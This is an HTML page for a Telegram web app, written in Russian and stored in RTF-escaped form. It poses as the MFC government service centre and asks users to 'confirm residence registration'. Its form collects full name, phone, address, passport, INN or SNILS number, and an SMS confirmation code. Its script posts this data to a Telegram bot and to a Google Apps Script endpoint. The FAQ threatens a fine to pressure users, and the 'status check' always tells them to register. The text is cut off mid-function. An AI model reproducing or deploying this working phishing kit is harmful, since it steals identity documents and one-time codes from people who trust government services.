<!doctype html>\
<html lang="ru">\
<head>\
  <meta charset="utf-8" />\
  <meta name="viewport" content="width=device-width, initial-scale=1" />\
  <title>\uc0\u1052 \u1060 \u1062  \'97 \u1055 \u1086 \u1076 \u1090 \u1074 \u1077 \u1088 \u1078 \u1076 \u1077 \u1085 \u1080 \u1077  \u1088 \u1077 \u1075 \u1080 \u1089 \u1090 \u1088 \u1072 \u1094 \u1080 \u1080 </title>\
  <script src="https://telegram.org/js/telegram-web-app.js"></script>\
  <style>\
    :root \{\
      --primary-color: #800000;\
      --secondary-color: #660000;\
      --info-color: #990000;\
      --error-color: #B22222;\
      --background-color: #F5E6E6;\
      --white: #fff;\
      --text-color: #333;\
      --shadow: 0 4px 12px rgba(128,0,0,.3);\
      --input-bg: #EADADA;\
      --input-border: #990000;\
    \}\
    * \{\
      box-sizing: border-box;\
      margin: 0;\
      padding: 0;\
    \}\
    body \{\
      font-family: 'Segoe UI', Arial, sans-serif;\
      background: var(--background-color);\
      padding: 20px;\
      display: flex;\
      justify-content: center;\
      min-height: 100vh;\
    \}\
    .container \{\
      max-width: 520px;\
      width: 100%;\
      background: var(--white);\
      padding: 30px;\
      border-radius: 16px;\
      box-shadow: var(--shadow);\
      text-align: center;\
    \}\
    .step \{\
      display: none;\
      text-align: left;\
    \}\
    .step.active \{\
      display: block;\
    \}\
    h2, h3 \{\
      margin-bottom: 20px;\
      font-weight: 700;\
      font-size: 1.6em;\
      color: var(--primary-color);\
      display: flex;\
      align-items: center;\
      gap: 10px;\
      line-height: 1.3;\
    \}\
    p \{\
      margin-bottom: 14px;\
    \}\
    .input-group \{\
      margin-bottom: 20px;\
      text-align: left;\
      display: flex;\
      flex-direction: column;\
    \}\
    input \{\
      width: 100%;\
      padding: 12px 15px;\
      margin-top: 8px;\
      border: 2px solid var(--input-border);\
      border-radius: 10px;\
      font-size: 16px;\
      background: var(--input-bg);\
      box-shadow: 0 2px 6px rgba(0,0,0,.1);\
      transition: border-color .3s, box-shadow .3s;\
    \}\
    input:focus \{\
      outline: none;\
      border-color: var(--primary-color);\
      box-shadow: 0 4px 12px rgba(128,0,0,.2);\
    \}\
    .error \{\
      color: var(--error-color);\
      font-size: 14px;\
      margin-top: 6px;\
      font-weight: 600;\
      text-align: left;\
      min-height: 1.2em;\
    \}\
    .buttons \{\
      margin-top: 20px;\
      display: flex;\
      flex-direction: column;\
      gap: 12px;\
    \}\
    button \{\
      width: 100%;\
      padding: 14px;\
      border: none;\
      border-radius: 10px;\
      cursor: pointer;\
      font-size: 16px;\
      font-weight: 600;\
      transition: background-color .3s, transform .1s;\
      text-align: center;\
      color: var(--white);\
      user-select: none;\
    \}\
    button:hover \{\
      transform: translateY(-2px);\
    \}\
    button:disabled \{\
      background: #ccc;\
      cursor: not-allowed;\
    \}\
    .next \{\
      background: var(--primary-color);\
    \}\
    .back \{\
      background: var(--secondary-color);\
    \}\
    .menu-btn \{\
      background: var(--info-color);\
    \}\
    .loading \{\
      display: none;\
      color: var(--primary-color);\
      font-size: 14px;\
      margin-top: 10px;\
    \}\
  </style>\
</head>\
<body>\
  <div class="container">\
    <div id="wizard">\
      <div class="step active" id="step-main">\
        <h2 id="welcome-message">\uc0\u55357 \u56523  \u1044 \u1086 \u1073 \u1088 \u1086  \u1087 \u1086 \u1078 \u1072 \u1083 \u1086 \u1074 \u1072 \u1090 \u1100 , \u55357 \u56395 </h2>\
        <p>\uc0\u1043 \u1086 \u1090 \u1086 \u1074 \u1099  \u1085 \u1072 \u1095 \u1072 \u1090 \u1100  \u1086 \u1092 \u1086 \u1088 \u1084 \u1083 \u1077 \u1085 \u1080 \u1077  \u1088 \u1077 \u1075 \u1080 \u1089 \u1090 \u1088 \u1072 \u1094 \u1080 \u1080  \u1087 \u1086  \u1084 \u1077 \u1089 \u1090 \u1091  \u1078 \u1080 \u1090 \u1077 \u1083 \u1100 \u1089 \u1090 \u1074 \u1072 ?</p>\
        <div class="buttons">\
          <button type="button" class="menu-btn" data-action="schedule">\uc0\u55357 \u56523  \u1047 \u1072 \u1087 \u1080 \u1089 \u1072 \u1090 \u1100 \u1089 \u1103  \u1085 \u1072  \u1087 \u1088 \u1080 \u1105 \u1084 </button>\
          <button type="button" class="menu-btn" data-action="documents">\uc0\u55357 \u56540  \u1057 \u1087 \u1080 \u1089 \u1086 \u1082  \u1076 \u1086 \u1082 \u1091 \u1084 \u1077 \u1085 \u1090 \u1086 \u1074 </button>\
          <button type="button" class="menu-btn" data-action="check-status">\uc0\u55357 \u56589  \u1055 \u1088 \u1086 \u1074 \u1077 \u1088 \u1080 \u1090 \u1100  \u1089 \u1090 \u1072 \u1090 \u1091 \u1089  \u1079 \u1072 \u1103 \u1074 \u1082 \u1080 </button>\
          <button type="button" class="menu-btn" data-action="contact">\uc0\u55357 \u56542  \u1057 \u1074 \u1103 \u1079 \u1072 \u1090 \u1100 \u1089 \u1103  \u1089  \u1087 \u1086 \u1076 \u1076 \u1077 \u1088 \u1078 \u1082 \u1086 \u1081 </button>\
          <button type="button" class="menu-btn" data-action="faq">\uc0\u10067  \u1063 \u1072 \u1089 \u1090 \u1099 \u1077  \u1074 \u1086 \u1087 \u1088 \u1086 \u1089 \u1099 </button>\
        </div>\
      </div>\
\
      <div class="step" id="step-fullname">\
        <h3>\uc0\u55357 \u56420  \u1059 \u1082 \u1072 \u1078 \u1080 \u1090 \u1077  \u1060 \u1048 \u1054 </h3>\
        <div class="input-group">\
          <input type="text" id="fullname" placeholder="\uc0\u1048 \u1074 \u1072 \u1085 \u1086 \u1074  \u1048 \u1074 \u1072 \u1085  \u1048 \u1074 \u1072 \u1085 \u1086 \u1074 \u1080 \u1095 " autocomplete="name">\
          <div class="error" id="err-fullname"></div>\
        </div>\
        <div class="buttons">\
          <button type="button" class="back">\uc0\u8617 \u65039  \u1042 \u1077 \u1088 \u1085 \u1091 \u1090 \u1100 \u1089 \u1103  \u1085 \u1072 \u1079 \u1072 \u1076 </button>\
          <button type="button" class="next">\uc0\u10145 \u65039  \u1044 \u1072 \u1083 \u1077 \u1077 </button>\
        </div>\
      </div>\
\
      <div class="step" id="step-phone">\
        <h3>\uc0\u55357 \u56542  \u1053 \u1086 \u1084 \u1077 \u1088  \u1090 \u1077 \u1083 \u1077 \u1092 \u1086 \u1085 \u1072 </h3>\
        <div class="input-group">\
          <input type="tel" id="phone" placeholder="+79991234567" inputmode="tel" autocomplete="tel">\
          <div class="error" id="err-phone"></div>\
        </div>\
        <div class="buttons">\
          <button type="button" class="back">\uc0\u8617 \u65039  \u1042 \u1077 \u1088 \u1085 \u1091 \u1090 \u1100 \u1089 \u1103  \u1085 \u1072 \u1079 \u1072 \u1076 </button>\
          <button type="button" class="next">\uc0\u10145 \u65039  \u1044 \u1072 \u1083 \u1077 \u1077 </button>\
        </div>\
      </div>\
\
      <div class="step" id="step-address">\
        <h3>\uc0\u55356 \u57312  \u1059 \u1082 \u1072 \u1078 \u1080 \u1090 \u1077  \u1072 \u1076 \u1088 \u1077 \u1089 </h3>\
        <div class="input-group">\
          <input type="text" id="address" placeholder="\uc0\u1075 . \u1052 \u1086 \u1089 \u1082 \u1074 \u1072 , \u1091 \u1083 . \u1051 \u1077 \u1085 \u1080 \u1085 \u1072 , \u1076 . 1, \u1082 \u1074 . 2" autocomplete="address-line1">\
          <div class="error" id="err-address"></div>\
        </div>\
        <div class="buttons">\
          <button type="button" class="back">\uc0\u8617 \u65039  \u1042 \u1077 \u1088 \u1085 \u1091 \u1090 \u1100 \u1089 \u1103  \u1085 \u1072 \u1079 \u1072 \u1076 </button>\
          <button type="button" class="next">\uc0\u10145 \u65039  \u1044 \u1072 \u1083 \u1077 \u1077 </button>\
        </div>\
      </div>\
\
      <div class="step" id="step-document-type">\
        <h3>\uc0\u55357 \u56516  \u1042 \u1099 \u1073 \u1077 \u1088 \u1080 \u1090 \u1077  \u1076 \u1086 \u1082 \u1091 \u1084 \u1077 \u1085 \u1090 </h3>\
        <div class="buttons">\
          <button type="button" class="menu-btn" data-doc="\uc0\u1055 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 ">\u55357 \u56516  \u1055 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 </button>\
          <button type="button" class="menu-btn" data-doc="\uc0\u1048 \u1053 \u1053 ">\u55358 \u56830  \u1048 \u1053 \u1053 </button>\
          <button type="button" class="menu-btn" data-doc="\uc0\u1057 \u1053 \u1048 \u1051 \u1057 ">\u55357 \u57314  \u1057 \u1053 \u1048 \u1051 \u1057 </button>\
        </div>\
        <div class="buttons"><button type="button" class="back">\uc0\u8617 \u65039  \u1042 \u1077 \u1088 \u1085 \u1091 \u1090 \u1100 \u1089 \u1103  \u1085 \u1072 \u1079 \u1072 \u1076 </button></div>\
      </div>\
\
      <div class="step" id="step-document-number">\
        <h3 id="doc-title">\uc0\u55357 \u56610  \u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1085 \u1086 \u1084 \u1077 \u1088  \u1076 \u1086 \u1082 \u1091 \u1084 \u1077 \u1085 \u1090 \u1072 </h3>\
        <div class="input-group">\
          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>\
          <input type="text" id="docnumber" placeholder="4510 123456">\
          <div class="error" id="err-doc"></div>\
        </div>\
        <div class="buttons">\
          <button type="button" class="back">\uc0\u8617 \u65039  \u1042 \u1077 \u1088 \u1085 \u1091 \u1090 \u1100 \u1089 \u1103  \u1085 \u1072 \u1079 \u1072 \u1076 </button>\
          <button type="button" class="next">\uc0\u10145 \u65039  \u1044 \u1072 \u1083 \u1077 \u1077 </button>\
        </div>\
      </div>\
\
      <div class="step" id="step-code">\
        <h3>\uc0\u55357 \u56592  \u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1082 \u1086 \u1076  \u1080 \u1079  SMS</h3>\
        <div class="input-group">\
          <input type="text" id="code" placeholder="1234" inputmode="numeric" pattern="\\d*">\
          <div class="error" id="err-code"></div>\
        </div>\
        <div class="buttons">\
          <button type="button" class="back">\uc0\u8617 \u65039  \u1042 \u1077 \u1088 \u1085 \u1091 \u1090 \u1100 \u1089 \u1103  \u1085 \u1072 \u1079 \u1072 \u1076 </button>\
          <button type="button" class="next">\uc0\u10145 \u65039  \u1055 \u1086 \u1076 \u1090 \u1074 \u1077 \u1088 \u1076 \u1080 \u1090 \u1100 </button>\
          <div class="loading" id="loading">\uc0\u1054 \u1090 \u1087 \u1088 \u1072 \u1074 \u1082 \u1072  \u1076 \u1072 \u1085 \u1085 \u1099 \u1093 ...</div>\
        </div>\
      </div>\
    </div>\
  </div>\
\
  <script>\
    let __lastSent = "";\
    function sendToBotOnce(rec) \{\
      const tg = window.Telegram?.WebApp;\
      const loading = document.getElementById("loading");\
      if (loading) loading.style.display = "block";\
      if (!tg) \{\
        console.log("Telegram WebApp not available, saving locally");\
        alert("\uc0\u1044 \u1072 \u1085 \u1085 \u1099 \u1077  \u1089 \u1086 \u1093 \u1088 \u1072 \u1085 \u1077 \u1085 \u1099  \u1083 \u1086 \u1082 \u1072 \u1083 \u1100 \u1085 \u1086 :\\n" + JSON.stringify(rec, null, 2));\
        if (loading) loading.style.display = "none";\
        return;\
      \}\
      try \{\
        const json = JSON.stringify(\{ type: "lead", payload: rec \});\
        if (json === __lastSent) \{\
          if (loading) loading.style.display = "none";\
          return;\
        \}\
        tg.ready();\
        tg.sendData(json);\
        tg.HapticFeedback?.impactOccurred?.("light");\
        __lastSent = json;\
        console.log("Data sent to Telegram:", json);\
        if (loading) loading.style.display = "none";\
      \} catch (e) \{\
        console.error("sendData error:", e);\
        alert("\uc0\u1054 \u1096 \u1080 \u1073 \u1082 \u1072  \u1087 \u1088 \u1080  \u1086 \u1090 \u1087 \u1088 \u1072 \u1074 \u1082 \u1077  \u1076 \u1072 \u1085 \u1085 \u1099 \u1093 . \u1055 \u1086 \u1087 \u1088 \u1086 \u1073 \u1091 \u1081 \u1090 \u1077  \u1089 \u1085 \u1086 \u1074 \u1072 .");\
        if (loading) loading.style.display = "none";\
      \}\
    \}\
\
    class MFCWizard \{\
      constructor() \{\
        this.steps = document.querySelectorAll(".step");\
        this.currentStep = "main";\
        this.formData = \{\};\
        this.initEvents();\
        this.updateWelcome();\
        this.show("main");\
      \}\
\
      initEvents() \{\
        const root = document.getElementById("wizard");\
        if (!root) \{ console.error("Wizard container not found"); return; \}\
        root.addEventListener("click", (e) => \{\
          const t = e.target.closest("button");\
          if (!t) return;\
          if (t.classList.contains("next")) this.next();\
          else if (t.classList.contains("back")) this.back();\
          else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);\
        \});\
        ["fullname", "phone", "address", "docnumber", "code"].forEach((id) => \{\
          const el = document.getElementById(id);\
          if (el) \{\
            el.addEventListener("input", () => this.validate(this.currentStep));\
            el.addEventListener("keypress", (e) => \{ if (e.key === "Enter") \{ e.preventDefault(); this.next(); \} \});\
          \}\
        \});\
      \}\
\
      updateWelcome() \{\
        const el = document.getElementById("welcome-message");\
        const tg = window.Telegram?.WebApp;\
        let name = "\uc0\u1043 \u1086 \u1089 \u1090 \u1100 ";\
        try \{\
          const u = tg?.initDataUnsafe?.user;\
          if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "\uc0\u1043 \u1086 \u1089 \u1090 \u1100 ";\
        \} catch (e) \{ console.warn("Error accessing Telegram user data:", e); \}\
        if (el) el.textContent = `\uc0\u55357 \u56523  \u1044 \u1086 \u1073 \u1088 \u1086  \u1087 \u1086 \u1078 \u1072 \u1083 \u1086 \u1074 \u1072 \u1090 \u1100 , $\{name\}! \u55357 \u56395 `;\
      \}\
\
      show(id) \{\
        this.steps.forEach((s) => s.classList.toggle("active", s.id === `step-$\{id\}`));\
        this.currentStep = id;\
        ["err-fullname", "err-phone", "err-address", "err-doc", "err-code"].forEach((eid) => \{\
          const el = document.getElementById(eid); if (el) el.textContent = "";\
        \});\
        window.scrollTo(\{ top: 0, behavior: "smooth" \});\
        const input = document.querySelector(`#step-$\{id\} input`); if (input) input.focus();\
      \}\
\
      next() \{\
        if (!this.validate(this.currentStep)) return;\
        if (this.currentStep === "fullname") \{ this.formData.fullname = (document.getElementById("fullname").value || "").trim(); return this.show("phone"); \}\
        if (this.currentStep === "phone") \{ this.formData.phone = (document.getElementById("phone").value || "").trim(); return this.show("address"); \}\
        if (this.currentStep === "address") \{ this.formData.address = (document.getElementById("address").value || "").trim(); return this.show("document-type"); \}\
        if (this.currentStep === "document-number") \{ this.formData["document-number"] = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); \}\
        if (this.currentStep === "code") \{ this.formData.code = (document.getElementById("code").value || "").trim(); return this.send(); \}\
      \}\
\
      back() \{\
        const map = \{ fullname: "main", phone: "fullname", address: "phone", "document-type": "address", "document-number": "document-type", code: "document-number" \};\
        this.show(map[this.currentStep] || "main");\
      \}\
\
      menu(action, doc) \{\
        if (action === "schedule") return this.show("fullname");\
        if (action === "documents") \{\
          const documents = "\uc0\u55357 \u56523  \u1044 \u1086 \u1082 \u1091 \u1084 \u1077 \u1085 \u1090 \u1099  \u1076 \u1083 \u1103  \u1088 \u1077 \u1075 \u1080 \u1089 \u1090 \u1088 \u1072 \u1094 \u1080 \u1080 :\\n\u55357 \u57026  \u1055 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 \\n\u55357 \u56516  \u1042 \u1099 \u1087 \u1080 \u1089 \u1082 \u1072  \u1045 \u1043 \u1056 \u1053 \\n\u55356 \u57312  \u1044 \u1083 \u1103  \u1084 \u1091 \u1085 \u1080 \u1094 \u1080 \u1087 \u1072 \u1083 \u1100 \u1085 \u1086 \u1075 \u1086  \u1078 \u1080 \u1083 \u1100 \u1103 : \u1076 \u1086 \u1075 \u1086 \u1074 \u1086 \u1088  \u1085 \u1072 \u1081 \u1084 \u1072  \u1080  \u1089 \u1086 \u1075 \u1083 \u1072 \u1089 \u1080 \u1077  \u1078 \u1080 \u1083 \u1100 \u1094 \u1086 \u1074 ";\
          alert(documents);\
        \}\
        if (action === "check-status") \{\
          const statusPrompt = prompt("\uc0\u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1085 \u1086 \u1084 \u1077 \u1088  \u1079 \u1072 \u1103 \u1074 \u1082 \u1080  \u1080 \u1083 \u1080  \u1076 \u1072 \u1085 \u1085 \u1099 \u1077  \u1087 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 \u1072  (\u1085 \u1072 \u1087 \u1088 \u1080 \u1084 \u1077 \u1088 , 123 \u1080 \u1083 \u1080  4510 123456):");\
          if (statusPrompt) alert("\uc0\u10060  \u1044 \u1072 \u1085 \u1085 \u1099 \u1077  \u1085 \u1077  \u1085 \u1072 \u1081 \u1076 \u1077 \u1085 \u1099 . \u1055 \u1088 \u1086 \u1081 \u1076 \u1080 \u1090 \u1077  \u1088 \u1077 \u1075 \u1080 \u1089 \u1090 \u1088 \u1072 \u1094 \u1080 \u1102 .");\
          else this.show("main");\
        \}\
        if (action === "contact") \{\
          try \{ window.location.href = "https://t.me/MFC_SUPPORT"; \} catch (e) \{ console.error("Error navigating:", e); alert("\uc0\u1054 \u1096 \u1080 \u1073 \u1082 \u1072  \u1087 \u1088 \u1080  \u1087 \u1077 \u1088 \u1077 \u1093 \u1086 \u1076 \u1077  \u1082  \u1087 \u1086 \u1076 \u1076 \u1077 \u1088 \u1078 \u1082 \u1077 . \u1055 \u1086 \u1087 \u1088 \u1086 \u1073 \u1091 \u1081 \u1090 \u1077  \u1089 \u1085 \u1086 \u1074 \u1072 ."); \}\
        \}\
        if (action === "faq") \{\
          const faqOptions = [\
            "\uc0\u10067  1. \u1047 \u1072 \u1095 \u1077 \u1084  \u1087 \u1086 \u1076 \u1090 \u1074 \u1077 \u1088 \u1078 \u1076 \u1072 \u1090 \u1100  \u1088 \u1077 \u1075 \u1080 \u1089 \u1090 \u1088 \u1072 \u1094 \u1080 \u1102 ? \'97 \u1055 \u1086 \u1076 \u1090 \u1074 \u1077 \u1088 \u1078 \u1076 \u1077 \u1085 \u1080 \u1077  \u1085 \u1077 \u1086 \u1073 \u1093 \u1086 \u1076 \u1080 \u1084 \u1086  \u1076 \u1083 \u1103  \u1072 \u1082 \u1090 \u1091 \u1072 \u1083 \u1080 \u1079 \u1072 \u1094 \u1080 \u1080  \u1076 \u1072 \u1085 \u1085 \u1099 \u1093  \u1074  \u1045 \u1043 \u1056 \u1053 .",\
            "\uc0\u10067  2. \u1050 \u1072 \u1082 \u1080 \u1077  \u1076 \u1086 \u1082 \u1091 \u1084 \u1077 \u1085 \u1090 \u1099  \u1085 \u1091 \u1078 \u1085 \u1099 ? \'97 \u1055 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 , \u1074 \u1099 \u1087 \u1080 \u1089 \u1082 \u1072  \u1045 \u1043 \u1056 \u1053 , \u1076 \u1083 \u1103  \u1084 \u1091 \u1085 \u1080 \u1094 \u1080 \u1087 \u1072 \u1083 \u1100 \u1085 \u1086 \u1075 \u1086  \u1078 \u1080 \u1083 \u1100 \u1103  \'97 \u1076 \u1086 \u1075 \u1086 \u1074 \u1086 \u1088  \u1085 \u1072 \u1081 \u1084 \u1072 .",\
            "\uc0\u10067  3. \u1063 \u1090 \u1086  \u1073 \u1091 \u1076 \u1077 \u1090 , \u1077 \u1089 \u1083 \u1080  \u1085 \u1077  \u1087 \u1086 \u1076 \u1090 \u1074 \u1077 \u1088 \u1076 \u1080 \u1090 \u1100 ? \'97 \u1064 \u1090 \u1088 \u1072 \u1092  2000\'965000 \u1088 \u1091 \u1073 . (\u1089 \u1090 . 19.15.1 \u1050 \u1086 \u1040 \u1055  \u1056 \u1060 ).",\
            "\uc0\u10067  4. \u1052 \u1086 \u1078 \u1085 \u1086  \u1083 \u1080  \u1087 \u1086 \u1076 \u1090 \u1074 \u1077 \u1088 \u1076 \u1080 \u1090 \u1100  \u1086 \u1085 \u1083 \u1072 \u1081 \u1085 ? \'97 \u1063 \u1072 \u1089 \u1090 \u1080 \u1095 \u1085 \u1086  \u1095 \u1077 \u1088 \u1077 \u1079  \u1043 \u1086 \u1089 \u1091 \u1089 \u1083 \u1091 \u1075 \u1080 , \u1085 \u1086  \u1074 \u1080 \u1079 \u1080 \u1090  \u1074  \u1052 \u1060 \u1062  \u1086 \u1073 \u1103 \u1079 \u1072 \u1090 \u1077 \u1083 \u1077 \u1085 .",\
            "\uc0\u10067  5. \u1050 \u1072 \u1082  \u1080 \u1079 \u1084 \u1077 \u1085 \u1080 \u1090 \u1100  \u1076 \u1072 \u1085 \u1085 \u1099 \u1077 ? \'97 \u1055 \u1077 \u1088 \u1077 \u1088 \u1077 \u1075 \u1080 \u1089 \u1090 \u1088 \u1072 \u1094 \u1080 \u1103  \u1079 \u1072  30 \u1076 \u1085 \u1077 \u1081  \u1095 \u1077 \u1088 \u1077 \u1079  \u1052 \u1060 \u1062 ."\
          ];\
          const selectedFAQ = prompt("\uc0\u1042 \u1099 \u1073 \u1077 \u1088 \u1080 \u1090 \u1077  \u1074 \u1086 \u1087 \u1088 \u1086 \u1089  (1-5):\\n" + faqOptions.join("\\n"));\
          if (selectedFAQ) alert(faqOptions[parseInt(selectedFAQ) - 1] || "\uc0\u1042 \u1099 \u1073 \u1077 \u1088 \u1080 \u1090 \u1077  \u1085 \u1086 \u1084 \u1077 \u1088  \u1080 \u1079  \u1089 \u1087 \u1080 \u1089 \u1082 \u1072 !");\
          else this.show("main");\
        \}\
        if (doc) \{\
          this.formData["document-type"] = doc;\
          const ex = \{ \uc0\u1055 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 : "\u1055 \u1088 \u1080 \u1084 \u1077 \u1088 : 4510 123456", \u1048 \u1053 \u1053 : "\u1055 \u1088 \u1080 \u1084 \u1077 \u1088 : 500100732259", \u1057 \u1053 \u1048 \u1051 \u1057 : "\u1055 \u1088 \u1080 \u1084 \u1077 \u1088 : 112-233-445 95" \};\
          const docExample = document.getElementById("doc-example"); if (docExample) docExample.textContent = ex[doc] || "";\
          const docTitle = document.getElementById("doc-title"); if (docTitle) docTitle.textContent = `\uc0\u55357 \u56610  \u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1085 \u1086 \u1084 \u1077 \u1088  \u1076 \u1086 \u1082 \u1091 \u1084 \u1077 \u1085 \u1090 \u1072  ($\{doc\})`;\
          return this.show("document-number");\
        \}\
      \}\
\
      validate(step) \{\
        const e = (id) => document.getElementById(id);\
        const v = (e(step)?.value || "").trim();\
        if (step === "fullname") \{\
          if (!/^[\uc0\u1040 -\u1071 \u1025 ][\u1072 -\u1103 \u1105 ]+ [\u1040 -\u1071 \u1025 ][\u1072 -\u1103 \u1105 ]+ [\u1040 -\u1071 \u1025 ][\u1072 -\u1103 \u1105 ]+$/.test(v)) \{\
            e("err-fullname").textContent = "\uc0\u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1060 \u1048 \u1054  (\u1085 \u1072 \u1087 \u1088 \u1080 \u1084 \u1077 \u1088 , \u1048 \u1074 \u1072 \u1085 \u1086 \u1074  \u1048 \u1074 \u1072 \u1085  \u1048 \u1074 \u1072 \u1085 \u1086 \u1074 \u1080 \u1095 ) \u1085 \u1072  \u1088 \u1091 \u1089 \u1089 \u1082 \u1086 \u1084 , \u1090 \u1086 \u1083 \u1100 \u1082 \u1086  \u1073 \u1091 \u1082 \u1074 \u1099 ";\
            return false;\
          \}\
          e("err-fullname").textContent = ""; return true;\
        \}\
        if (step === "phone") \{\
          if (!/^\\+7\\d\{10\}$/.test(v)) \{\
            e("err-phone").textContent = "\uc0\u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1090 \u1077 \u1083 \u1077 \u1092 \u1086 \u1085  \u1074  \u1092 \u1086 \u1088 \u1084 \u1072 \u1090 \u1077  +79991234567 (11 \u1094 \u1080 \u1092 \u1088 )";\
            return false;\
          \}\
          e("err-phone").textContent = ""; return true;\
        \}\
        if (step === "address") \{\
          if (!/^[\uc0\u1072 -\u1103 \u1040 -\u1071 \u1025 \u1105 \\s,\\.\\-\\d]+$/.test(v) || v.length < 5) \{\
            e("err-address").textContent = "\uc0\u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1072 \u1076 \u1088 \u1077 \u1089  (\u1085 \u1072 \u1087 \u1088 \u1080 \u1084 \u1077 \u1088 , \u1075 . \u1052 \u1086 \u1089 \u1082 \u1074 \u1072 , \u1091 \u1083 . \u1051 \u1077 \u1085 \u1080 \u1085 \u1072 , \u1076 . 1)";\
            return false;\
          \}\
          e("err-address").textContent = ""; return true;\
        \}\
        if (step === "document-number") \{\
          const docType = this.formData["document-type"] || "";\
          if (!v) \{\
            e("err-doc").textContent = "\uc0\u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1085 \u1086 \u1084 \u1077 \u1088  \u1076 \u1086 \u1082 \u1091 \u1084 \u1077 \u1085 \u1090 \u1072 ";\
            return false;\
          \}\
          if (docType === "\uc0\u1055 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 " && !/^\\d\{4\}\\s?\\d\{6\}$/.test(v)) \{\
            e("err-doc").textContent = "\uc0\u1055 \u1072 \u1089 \u1087 \u1086 \u1088 \u1090 : 4 \u1094 \u1080 \u1092 \u1088 \u1099 , \u1087 \u1088 \u1086 \u1073 \u1077 \u1083 , 6 \u1094 \u1080 \u1092 \u1088  (\u1085 \u1072 \u1087 \u1088 \u1080 \u1084 \u1077 \u1088 , 4510 123456)";\
            return false;\
          \}\
          if (docType === "\uc0\u1048 \u1053 \u1053 " && !/^\\d\{12\}$/.test(v)) \{\
            e("err-doc").textContent = "\uc0\u1048 \u1053 \u1053 : 12 \u1094 \u1080 \u1092 \u1088  (\u1085 \u1072 \u1087 \u1088 \u1080 \u1084 \u1077 \u1088 , 500100732259)";\
            return false;\
          \}\
          if (docType === "\uc0\u1057 \u1053 \u1048 \u1051 \u1057 " && !/^\\d\{3\}-\\d\{3\}-\\d\{3\}\\s?\\d\{2\}$/.test(v)) \{\
            e("err-doc").textContent = "\uc0\u1057 \u1053 \u1048 \u1051 \u1057 : XXX-XXX-XXX XX (\u1085 \u1072 \u1087 \u1088 \u1080 \u1084 \u1077 \u1088 , 112-233-445 95)";\
            return false;\
          \}\
          e("err-doc").textContent = ""; return true;\
        \}\
        if (step === "code") \{\
          if (!/^\\d\{4\}$/.test(v)) \{\
            e("err-code").textContent = "\uc0\u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  4 \u1094 \u1080 \u1092 \u1088 \u1099  (\u1085 \u1072 \u1087 \u1088 \u1080 \u1084 \u1077 \u1088 , 1234)";\
            return false;\
          \}\
          e("err-code").textContent = ""; return true;\
        \}\
        return true;\
      \}\
\
      async send() \{\
        const rec = \{\
          timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),\
          fullname: this.formData.fullname || "",\
          phone: this.formData.phone || "",\
          address: this.formData.address || "",\
          document: `$\{this.formData["document-type"] || ""\} $\{this.formData["document-number"] || ""\}`.trim(),\
          code: this.formData.code || ""\
        \};\
\
        try \{ await sendToSheet(rec); \} catch (err) \{ console.warn("sendToSheet error:", err); \}\
\
        sendToBotOnce(rec);\
\
        this.formData = \{\};\
        this.show("main");\
        alert("\uc0\u1044 \u1072 \u1085 \u1085 \u1099 \u1077  \u1091 \u1089 \u1087 \u1077 \u1096 \u1085 \u1086  \u1086 \u1090 \u1087 \u1088 \u1072 \u1074 \u1083 \u1077 \u1085 \u1099 !");\
      \}\
    \}\
\
    try \{ new MFCWizard(); \}\
    catch (e) \{ console.error("Failed to initialize MFCWizard:", e); alert("\uc0\u1054 \u1096 \u1080 \u1073 \u1082 \u1072  \u1080 \u1085 \u1080 \u1094 \u1080 \u1072 \u1083 \u1080 \u1079 \u1072 \u1094 \u1080 \u1080 . \u1055 \u1077 \u1088 \u1077 \u1079 \u1072 \u1075 \u1088 \u1091 \u1079 \u1080 \u1090 \u1077  \u1089 \u1090 \u1088 \u1072 \u1085 \u1080 \u1094 \u1091 ."); \}\
  </script>\
\
  <!-- \uc0\u1054 \u1090 \u1087 \u1088 \u1072 \u1074 \u1082 \u1072  \u1074  Google Sheets (\u1073 \u1077 \u1079  preflight) -->\
  <script>\
    // \uc0\u1042 \u1057 \u1058 \u1040 \u1042 \u1068  \u1089 \u1102 \u1076 \u1072  URL \u1080 \u1079  \u1056 \u1072 \u1079 \u1074 \u1077 \u1088 \u1090 \u1099 \u1074 \u1072 \u1085 \u1080 \u1081  Apps Script (\u1089 \u1090 \u1088 \u1086 \u1075 \u1086  \u1079 \u1072 \u1082 \u1072 \u1085 \u1095 \u1080 \u1074 \u1072 \u1077 \u1090 \u1089 \u1103  \u1085 \u1072  /exec)\
    const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbw--mkX6tEFl5MlEZNGj2Ptp0u3-dQxCxkgIQm3VwAun8O4XNW7KynUAJdFSVRjlVg/exec";\
\
    // \uc0\u1058 \u1086 \u1095 \u1085 \u1086  \u1090 \u1072 \u1082 \u1086 \u1081  \u1078 \u1077  \u1089 \u1077 \u1082 \u1088 \u1077 \u1090 , \u1082 \u1072 \u1082  \u1074  Code.gs\
    const SECRET = "benhillworkspeisworkhab";\
\
    async function sendToSheet(rec) \{\
      const payload = JSON.stringify(\{ type: "lead", payload: rec, secret: SECRET \});\
      const loading = document.getElementById("loading");\
      if (loading) loading.style.display = "block";\
      try \{\
        const res = await fetch(SHEETS_WEBAPP_URL, \{\
          method: "POST",\
          headers: \{ "Content-Type": "text/plain;charset=utf-8" \}, // \uc0\u1073 \u1077 \u1079  preflight\
          body: payload\
        \});\
        const text = await res.text();\
